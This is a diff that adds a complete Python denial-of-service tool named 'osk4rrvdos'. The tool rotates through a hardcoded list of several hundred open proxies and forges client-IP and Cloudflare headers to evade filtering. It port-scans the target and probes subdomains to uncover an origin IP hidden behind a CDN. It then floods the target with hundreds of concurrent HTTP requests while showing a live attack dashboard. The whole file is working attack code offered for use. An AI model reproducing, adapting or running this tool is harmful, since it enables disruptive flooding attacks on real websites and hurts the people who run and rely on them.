@@ -1,0 +1,464 @@
+import sys
+import os
+import ssl
+import time
+import random
+import socket
+import asyncio
+import aiohttp
+import threading
+import base64
+from urllib.parse import urlparse
+
+PROXY_LIST = [
+    "81.177.160.200:80","190.110.226.122:80","150.136.163.51:80","114.111.151.41:80",
+    "103.87.149.14:80","176.61.151.123:80","219.93.101.63:80","190.119.132.61:80",
+    "12.50.107.217:80","198.111.166.184:80","167.99.124.118:80","41.184.92.220:80",
+    "47.238.103.100:8888","135.148.120.6:80","197.221.240.176:80","197.221.249.196:80",
+    "168.138.50.91:80","65.108.103.19:80","103.205.64.153:80","183.110.216.159:8090",
+    "183.110.216.128:8090","197.221.237.248:80","27.34.242.98:80","118.163.120.181:58837",
+    "34.140.137.151:80","168.110.52.228:3128","34.135.166.24:80","195.158.8.123:3128",
+    "35.209.198.222:80","65.108.203.36:18080","159.65.221.25:80","39.109.113.97:4090",
+    "145.241.117.33:8888","41.220.16.209:80","219.249.37.107:8382","143.42.66.91:80",
+    "173.212.245.136:8888","197.255.126.69:80","174.138.119.88:80","197.221.240.178:80",
+    "197.221.234.253:80","219.93.101.62:80","154.65.39.7:80","34.81.160.132:80",
+    "211.38.188.120:9080","45.10.163.12:80","147.231.163.133:80","202.133.88.173:80",
+    "157.90.10.15:3128","86.104.74.110:1081","41.220.16.208:80","12.50.107.221:80",
+    "12.50.107.222:80","91.132.92.231:80","43.133.44.89:8888","188.165.199.207:80",
+    "197.221.240.246:80","47.83.168.191:4000","197.221.249.197:80","190.119.132.62:80",
+    "167.71.182.192:80","97.213.92.28:80","20.164.75.153:8080","13.80.134.180:80",
+    "141.147.9.254:80","197.221.234.149:80","206.206.126.177:2412","65.108.203.35:28080",
+    "196.223.129.21:80","178.156.224.42:3128","51.159.28.39:80","43.205.124.6:3128",
+    "175.139.233.78:80","119.235.112.42:3128","94.158.49.82:3128","197.221.234.252:80",
+    "197.221.240.247:80","103.35.190.69:1082","41.220.22.7:80","41.220.16.215:80",
+    "46.47.197.210:3128","46.249.100.124:80","193.160.209.58:1080","8.219.97.248:80",
+    "103.65.237.92:5678","219.93.101.60:80","203.99.240.182:80","32.223.6.94:80",
+    "12.50.107.220:80","45.125.67.37:8443","185.82.218.85:80","185.214.108.46:40000",
+    "124.108.6.20:8085","15.235.131.237:8080","212.47.232.28:80","78.28.152.111:80",
+    "219.65.73.81:80","103.125.31.222:80","41.220.16.213:80","45.229.17.17:999",
+    "170.245.132.80:999","139.135.182.132:8081","138.91.159.185:80","196.1.93.10:80",
+    "197.221.240.240:80","60.249.94.208:3128","150.107.140.238:3128","195.26.224.135:80",
+    "41.220.16.218:80","5.161.103.41:88","75.84.71.14:80","37.187.74.125:80",
+    "172.237.73.24:80","185.85.111.18:80","23.247.136.254:80","50.122.86.118:80",
+    "113.160.132.26:8080","8.211.166.184:8081","12.50.107.219:80","84.47.150.125:1080",
+    "104.230.113.255:80","89.58.55.33:80","194.150.110.134:80","212.231.191.23:80",
+    "213.33.126.130:80","174.104.115.21:80","34.122.187.196:80","89.116.51.164:8080",
+    "77.110.119.136:3128","80.74.54.148:3128","139.162.200.213:80","62.113.119.14:8080",
+    "170.64.170.204:8080","147.45.178.211:14658","104.225.220.233:80","34.44.49.215:80",
+    "200.174.198.32:8888","97.74.87.226:80","66.135.16.53:80","179.106.29.223:9090",
+    "195.133.250.173:3127","38.156.23.41:999","167.99.236.14:80","175.139.233.76:80",
+    "194.150.220.163:1082","210.223.44.230:3128","133.18.234.13:80","45.146.243.133:1080",
+    "201.134.41.110:443","197.221.249.199:80","64.188.77.26:3128","175.101.240.38:80",
+    "5.161.50.82:8118","41.220.16.211:80","41.220.16.214:80","46.29.162.166:80",
+    "143.198.135.176:80","147.75.34.105:443","103.189.250.121:8080","162.240.19.30:80",
+    "167.71.222.124:10001","38.60.196.214:80","91.217.81.131:1080","197.221.249.198:80",
+    "82.114.228.67:1080","65.108.203.37:28080","195.231.69.203:80","14.143.222.113:57788",
+    "109.135.16.145:8789","160.25.237.163:1111","103.97.140.64:8080","185.216.106.227:6304",
+    "31.57.82.127:6708","45.61.121.216:6815","142.111.192.194:5790","82.23.206.133:5939",
+    "206.232.103.144:6301","107.173.36.96:5551","161.123.5.67:5116","198.46.148.19:5707",
+    "154.6.126.120:6091","82.26.212.156:5963","136.0.108.165:5841","185.226.204.141:5694",
+    "142.147.132.164:6359","45.39.4.109:5534","45.127.250.194:5803","82.23.203.63:5371",
+    "142.111.113.225:6586","173.239.219.159:6068","206.206.73.113:6729","173.239.219.141:6050",
+    "184.174.56.189:5201","192.154.250.70:5650","216.74.115.104:6698","198.89.123.103:6645",
+    "92.113.1.16:5716","161.123.33.139:6162","142.147.245.167:5858","89.116.78.61:5672",
+    "198.37.121.173:6593","192.241.125.132:8176","172.120.106.203:6358","191.101.188.91:6845",
+    "45.61.96.2:5982","45.43.70.160:6447","45.41.179.160:6695","192.177.103.54:6547",
+    "67.227.37.161:5703","173.239.219.65:5974","185.216.106.157:6234","216.74.114.159:6442",
+    "104.232.209.21:5979","107.175.56.128:6401","172.120.106.191:6346","104.233.15.197:5920",
+    "173.239.219.202:6111","38.154.191.224:8801","179.61.245.39:6818","173.244.41.156:6340",
+    "182.93.85.225:8080","166.88.85.12:6092","161.123.5.213:5262","107.172.116.12:5468",
+    "45.41.176.19:6317","104.232.209.144:6102","104.239.13.171:6800","84.46.204.213:6516",
+    "45.56.175.85:5759","86.38.154.198:5841","198.23.128.137:5765","161.123.101.80:6706",
+    "142.111.126.16:6743","147.124.198.36:5895","45.135.139.129:6432","104.239.105.25:6555",
+    "45.39.4.229:5654","166.88.58.115:5840","104.232.211.166:5779","192.210.132.194:6164",
+    "206.232.103.64:6221","107.181.154.82:5760","166.88.155.28:6187","162.220.246.183:6467",
+    "38.154.191.251:8828","199.180.9.111:6131","107.181.148.128:5988","84.46.204.247:6550",
+    "103.47.53.28:8326","45.43.64.222:6480","45.61.125.82:6093","198.46.241.228:6763",
+    "199.180.9.214:6234","166.88.3.168:6639","154.29.233.178:5939","136.0.109.181:6467",
+    "89.249.195.11:6766","89.116.78.87:5698","31.56.137.233:6309","45.61.100.183:6451",
+    "198.105.111.41:6719","154.6.23.171:6638","185.216.105.110:6687","188.215.5.249:5279",
+    "107.181.148.89:5949","145.223.44.211:5894","162.220.246.88:6372","45.61.96.48:6028",
+    "45.41.179.151:6686","104.253.48.92:5516","104.239.104.113:6337","198.23.239.188:6594",
+    "173.0.10.179:6355","173.211.30.152:6586","161.123.115.134:5155","107.175.135.160:6601",
+    "192.177.87.19:5865","154.30.242.224:9618","191.101.25.12:6409","107.172.221.249:6204",
+    "192.154.250.176:5756","23.236.182.114:5890","45.61.118.245:5942","142.111.192.183:5779",
+    "45.43.64.214:6472","45.43.64.63:6321","67.227.14.144:6736","184.174.30.244:5913",
+    "104.253.48.70:5494","172.120.120.30:5185","173.244.41.120:6304","45.61.127.251:6190",
+    "45.43.70.238:6525","84.46.204.97:6400","185.226.204.191:5744","23.229.19.216:8811",
+    "89.116.78.7:5618","198.105.122.23:6596",
+]
+
+UA_LIST = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7258.113 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 OPR/115.0.0.0",
+    "Mozilla/5.0 (X11; CrOS x86_64 16033.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 26_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
+]
+
+PATHS = [
+    "/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
+    "/index.html", "/index.php", "/home", "/about", "/contact",
+    "/api/v1/users", "/api/v2/status", "/api/health",
+    "/graphql", "/wp-admin/", "/wp-login.php", "/wp-json/wp/v2/users",
+    "/admin/", "/login", "/signup", "/search?q={}",
+]
+
+PORTS_TO_SCAN = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1433, 1521, 3306, 3389, 5432, 5800, 5900, 6379, 8080, 8443, 8888, 9090, 27017]
+
+CF_SUBS = ["direct", "origin", "direct-connect", "cpanel", "webmail", "mail", "ftp", "dev", "staging", "api"]
+
+running = True
+lock = threading.Lock()
+total_sent = 0
+total_ok = 0
+total_err = 0
+last_status = 0
+req_rate = 0
+rate_samples = []
+proxy_pool = []
+proxy_index = 0
+proxy_lock = threading.Lock()
+bypass_premium = False
+proxy_attack = False
+
+
+def gen_ip():
+    r = random.randint
+    return f"{r(1,223)}.{r(0,255)}.{r(0,255)}.{r(1,254)}"
+
+
+def next_proxy():
+    global proxy_index
+    if not proxy_pool:
+        return None
+    with proxy_lock:
+        p = proxy_pool[proxy_index % len(proxy_pool)]
+        proxy_index = (proxy_index + 1) % len(proxy_pool)
+        return f"http://{p}"
+
+
+def resolve_dns(host):
+    ips = set()
+    try:
+        for _, _, _, _, addr in socket.getaddrinfo(host, 80, socket.AF_INET, socket.SOCK_STREAM):
+            ips.add(addr[0])
+    except Exception:
+        pass
+    return list(ips)
+
+
+def scan_port(ip, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.8)
+        r = s.connect_ex((ip, port))
+        s.close()
+        return r == 0
+    except Exception:
+        return False
+
+
+def find_origin(host):
+    origins = set()
+    for sub in CF_SUBS:
+        sd = f"{sub}.{host}"
+        ips = resolve_dns(sd)
+        if ips:
+            origins.update(ips)
+    return list(origins)
+
+
+def build_headers(host):
+    ip1 = gen_ip()
+    ip2 = gen_ip()
+    rid = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
+    rv = str(random.randint(10000, 99999))
+
+    headers = {
+        "Host": host,
+        "User-Agent": random.choice(UA_LIST),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "pl-PL,pl;q=0.9"]),
+        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate"]),
+        "Cache-Control": "no-cache",
+        "Connection": random.choice(["keep-alive", "Keep-Alive", "close"]),
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": random.choice(["document", "empty"]),
+        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
+        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
+        "Sec-Ch-Ua": f'"Chromium";v="{random.randint(128,140)}", "Google Chrome";v="{random.randint(128,140)}"',
+        "Sec-Ch-Ua-Mobile": "?0",
+        "Sec-Ch-Ua-Platform": '"Windows"',
+        "Pragma": "no-cache",
+        "X-Forwarded-For": ip1,
+        "X-Real-IP": ip2,
+        "True-Client-IP": ip1,
+        "X-Originating-IP": ip2,
+        "X-Request-ID": rid,
+    }
+
+    if random.random() > 0.5:
+        headers["Referer"] = f"https://www.google.com/search?q={rv}"
+    if random.random() > 0.4:
+        headers["Origin"] = f"https://{host}"
+    if random.random() > 0.6:
+        cookie = base64.b64encode(random.randbytes(12)).decode()[:16]
+        headers["Cookie"] = f"sessionid={cookie}; _ga=GA1.2.{random.randint(100000000,999999999)}.{random.randint(1000000000,9999999999)}"
+
+    if bypass_premium:
+        headers["X-Client-IP"] = gen_ip()
+        headers["X-Forwarded-Host"] = host
+        headers["X-HTTP-Method-Override"] = "GET"
+        headers["X-Forwarded-Proto"] = "https"
+        headers["CF-Connecting-IP"] = gen_ip()
+        headers["X-Remote-IP"] = gen_ip()
+        headers["Client-IP"] = gen_ip()
+        headers["Via"] = f"{random.randint(1,2)}.{random.randint(0,9)} {random.choice(['squid','nginx','varnish'])}"
+        headers["CF-IPCountry"] = random.choice(["US", "DE", "PL", "GB", "JP"])
+
+    return headers
+
+
+def print_live():
+    global total_sent, total_ok, total_err, req_rate, last_status
+    os.system("cls" if os.name == "nt" else "clear")
+    print(r"""
+  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
+ /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
+| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
+| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
+| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
+| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
+|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
+ \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
+""")
+    print(f" Live Status:")
+    print(f" Requests Sent   : {total_sent}")
+    print(f" Requests per sec: {req_rate:.1f}")
+    print(f" OK (2xx/3xx)    : {total_ok}")
+    print(f" Errors          : {total_err}")
+    print(f" Proxies loaded  : {len(proxy_pool)}")
+    print(f" Premium Bypass  : {'ON' if bypass_premium else 'OFF'}")
+    print(f" Proxy Attack    : {'ON' if proxy_attack else 'OFF'}")
+    print(f"\n Last Request:")
+    print(f" HTTP CODE: {last_status}")
+    print(f"\n Press Ctrl+C to stop.")
+
+
+async def attack_worker(session, url, host, tid):
+    global total_sent, total_ok, total_err, last_status, rate_samples
+
+    while running:
+        path = random.choice(PATHS).replace("{}", str(random.randint(10000, 99999)))
+        headers = build_headers(host)
+        parsed = urlparse(url)
+        target = f"{parsed.scheme}://{parsed.netloc}{path}"
+        proxy = next_proxy() if proxy_attack else None
+
+        try:
+            method = "GET" if random.random() > 0.85 else "POST"
+            if method == "POST":
+                data = f"q={random.randint(1000,9999)}&t={random.randint(100,999)}"
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+                async with session.post(target, headers=headers, data=data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                    await resp.read()
+                    with lock:
+                        total_sent += 1
+                        last_status = resp.status
+                        if 200 <= resp.status < 400:
+                            total_ok += 1
+            else:
+                async with session.get(target, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=5)) as resp:
+                    await resp.read()
+                    with lock:
+                        total_sent += 1
+                        last_status = resp.status
+                        if 200 <= resp.status < 400:
+                            total_ok += 1
+        except Exception:
+            with lock:
+                total_err += 1
+
+        rate_samples.append(time.time())
+        if not bypass_premium:
+            await asyncio.sleep(random.uniform(0.001, 0.005))
+
+
+async def http_attack(url, host, conns):
+    ssl_context = True if urlparse(url).scheme == "https" else False
+    connector = aiohttp.TCPConnector(
+        ssl=ssl_context,
+        limit=conns * 2,
+        limit_per_host=conns,
+        force_close=True,
+        enable_cleanup_closed=True,
+    )
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = [asyncio.create_task(attack_worker(session, url, host, i)) for i in range(conns)]
+        try:
+            while running:
+                await asyncio.sleep(0.5)
+        except asyncio.CancelledError:
+            pass
+        for t in tasks:
+            t.cancel()
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+
+def stats_loop():
+    global req_rate, rate_samples
+    while running:
+        time.sleep(2)
+        now = time.time()
+        rate_samples = [t for t in rate_samples if now - t < 2]
+        with lock:
+            req_rate = len(rate_samples) / 2
+        print_live()
+
+
+def check_live(url, host):
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+
+        async def test():
+            connector = aiohttp.TCPConnector(ssl=False, limit=1)
+            async with aiohttp.ClientSession(connector=connector) as s:
+                hdrs = build_headers(host)
+                async with s.get(url, headers=hdrs, timeout=aiohttp.ClientTimeout(total=5)) as r:
+                    return r.status, dict(r.headers), len(await r.read())
+
+        status, hdrs, sz = loop.run_until_complete(test())
+        loop.close()
+        return status, hdrs.get("Server", "?"), sz
+    except Exception as e:
+        return 0, str(e)[:50], 0
+
+
+def main():
+    global running, bypass_premium, proxy_attack, proxy_pool
+
+    os.system("cls" if os.name == "nt" else "clear")
+    os.system("title osk4rrvdos" if os.name == "nt" else "")
+
+    print(r"""
+  /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$  /$$$$$$$  /$$    /$$       /$$$$$$$   /$$$$$$   /$$$$$$
+ /$$__  $$ /$$__  $$| $$  /$$/| $$  | $$| $$__  $$| $$__  $$| $$   | $$      | $$__  $$ /$$__  $$ /$$__  $$
+| $$  \ $$| $$  \__/| $$ /$$/ | $$  | $$| $$  \ $$| $$  \ $$| $$   | $$      | $$  \ $$| $$  \ $$| $$  \__/
+| $$  | $$|  $$$$$$ | $$$$$/  | $$$$$$$$| $$$$$$$/| $$$$$$$/|  $$ / $$/      | $$  | $$| $$  | $$|  $$$$$$
+| $$  | $$ \____  $$| $$  $$  |_____  $$| $$__  $$| $$__  $$ \  $$ $$/       | $$  | $$| $$  | $$ \____  $$
+| $$  | $$ /$$  \ $$| $$\  $$       | $$| $$  \ $$| $$  \ $$  \  $$$/        | $$  | $$| $$  | $$ /$$  \ $$
+|  $$$$$$/|  $$$$$$/| $$ \  $$      | $$| $$  | $$| $$  | $$   \  $/         | $$$$$$$/|  $$$$$$/|  $$$$$$/
+ \______/  \______/ |__/  \__/      |__/|__/  |__/|__/  |__/    \_/          |_______/  \______/  \______/
+""")
+
+    print(f"[...] Checking & Loading libraries and Python")
+    print(f"</> Python version detected: {sys.version.split()[0]}")
+    print(f"</> aiohttp: {aiohttp.__version__}")
+
+    target = input("\n[osk4rrvdos] type URL or Proxy > ").strip()
+    if not target:
+        print("[-] E: No target provided")
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    parsed = urlparse(target)
+    host = parsed.hostname
+    scheme = parsed.scheme
+    port = parsed.port or (443 if scheme == "https" else 80)
+
+    pa = input("[?] Proxy attack [MAY NOT WORK] y/n > ").strip().lower()
+    proxy_attack = pa == "y"
+
+    bp = input("[?] Bypass y/n > ").strip().lower()
+    bypass_premium = bp == "y"
+
+    print(f"\n[*] Target: {scheme}://{host}:{port}")
+
+    proxy_pool = PROXY_LIST.copy()
+    if proxy_attack:
+        random.shuffle(proxy_pool)
+        print(f"[+] Proxy pool: {len(proxy_pool)} proxies")
+
+    print("[*] Resolving DNS...")
+    ips = resolve_dns(host)
+    ip = ips[0] if ips else host
+    print(f"[+] Resolved IPs: {', '.join(ips[:5] or [host])}")
+
+    print("[*] Scanning common ports...")
+    open_ports = []
+    for p in PORTS_TO_SCAN:
+        if scan_port(ip, p):
+            svc = {21:"FTP",22:"SSH",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",465:"SMTPS",587:"SMTP",993:"IMAPS",995:"POP3S",1433:"MSSQL",1521:"Oracle",3306:"MySQL",3389:"RDP",5432:"Postgres",5800:"VNC",5900:"VNC",6379:"Redis",8080:"HTTP",8443:"HTTPS",8888:"HTTP",9090:"HTTP",27017:"MongoDB"}.get(p,"?")
+            open_ports.append(f"{p} ({svc})")
+    if open_ports:
+        print(f"[+] Open ports: {', '.join(open_ports)}")
+    else:
+        print("[+] No common ports open (still attacking target)")
+
+    print("[*] Checking CDN/WAF...")
+    status, server, size = check_live(target, host)
+    print(f"[+] Status: {status} | Server: {server} | Size: {size}b")
+
+    if "cloudflare" in str(server).lower():
+        print("[!] Cloudflare detected!")
+        print("[*] Searching origin IP...")
+        origins = find_origin(host)
+        if origins:
+            print("[+] Possible origin IPs:")
+            for o in origins[:8]:
+                print(f"    {o}")
+
+    if bypass_premium:
+        conns = 300
+    elif proxy_attack:
+        conns = min(150, len(proxy_pool))
+    else:
+        conns = 150
+
+    print(f"\n[*] Launching attack ({conns} connections)...\n")
+    print_live()
+
+    threading.Thread(target=stats_loop, daemon=True).start()
+
+    running = True
+
+    def run_http():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(http_attack(target, host, conns))
+        loop.close()
+
+    http_thread = threading.Thread(target=run_http, daemon=True)
+    http_thread.start()
+
+    try:
+        while http_thread.is_alive():
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print("\n[!] Stopping...")
+
+    running = False
+    http_thread.join(timeout=3)
+
+    print(f"\n[+] Attack finished.")
+    print(f"    Requests: {total_sent}")
+    print(f"    OK:       {total_ok}")
+    print(f"    Errors:   {total_err}")
+
+
+if __name__ == "__main__":
+    main()
